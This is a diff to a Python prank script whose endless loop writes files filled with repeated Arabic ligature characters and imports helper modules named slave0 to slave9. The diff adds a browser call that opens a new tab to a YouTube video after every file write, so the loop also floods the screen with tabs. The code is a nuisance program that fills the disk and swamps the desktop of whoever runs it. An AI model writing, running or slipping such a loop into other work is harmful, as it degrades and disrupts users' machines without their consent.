@@ -1,4 +1,4 @@
-import os, time, random
+import os, time, random, webbrowser
 from os import system, name
 from pathlib import Path
 import slave0, slave1, slave2, slave3, slave4, slave5, slave6, slave7, slave8, slave9
@@ -47,7 +47,7 @@ h = 1
 i = 1
 j = 1
 k = 1
-
+url = 'https://www.youtube.com/watch?v=oHg5SJYRHA0'
 #while True:
 while True:
     nice_name = random.randint(1,10)
@@ -95,6 +95,7 @@ while True:
         '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\n')
     f.close()
     a = a+1
+    webbrowser.open_new_tab(url= url)
 
 
     nice_name = random.randint(1,10)
@@ -142,6 +143,7 @@ while True:
         '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\n')
     f.close()
     b = b+1
+    webbrowser.open_new_tab(url= url)
 
     nice_name = random.randint(1,10)
     if nice_name == 1:
@@ -188,6 +190,7 @@ while True:
         '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\n')
     f.close()
     c = c+1
+    webbrowser.open_new_tab(url= url)
 
     nice_name = random.randint(1,10)
     if nice_name == 1:
@@ -234,6 +237,7 @@ while True:
         '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\n')
     f.close()
     d= d+1
+    webbrowser.open_new_tab(url= url)
 
     nice_name = random.randint(1,10)
     if nice_name == 1:
@@ -280,6 +284,7 @@ while True:
         '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\n')
     f.close()
     e = e+1
+    webbrowser.open_new_tab(url= url)
     
     nice_name = random.randint(1,10)
     if nice_name == 1:
@@ -326,6 +331,7 @@ while True:
         '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\n')
     f.close()
     l = l+1
+    webbrowser.open_new_tab(url= url)
 
     nice_name = random.randint(1,10)
     if nice_name == 1:
@@ -372,6 +378,7 @@ while True:
         '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\n')
     f.close()
     g = g +1
+    webbrowser.open_new_tab(url= url)
 
     nice_name = random.randint(1,10)
     if nice_name == 1:
@@ -418,6 +425,7 @@ while True:
         '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\n')
     f.close()
     h = h+1
+    webbrowser.open_new_tab(url= url)
 
     nice_name = random.randint(1,10)
     if nice_name == 1:
@@ -464,6 +472,7 @@ while True:
         '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\n')
     f.close()
     i = i+1
+    webbrowser.open_new_tab(url= url)
 
     nice_name = random.randint(1,10)
     if nice_name == 1:
@@ -510,6 +519,7 @@ while True:
         '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\n')
     f.close()
     j =j +1
+    webbrowser.open_new_tab(url= url)
 
     nice_name = random.randint(1,10)
     if nice_name == 1:
@@ -556,3 +566,4 @@ while True:
         '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\n')
     f.close()
     k = k+1
+    webbrowser.open_new_tab(url= url)
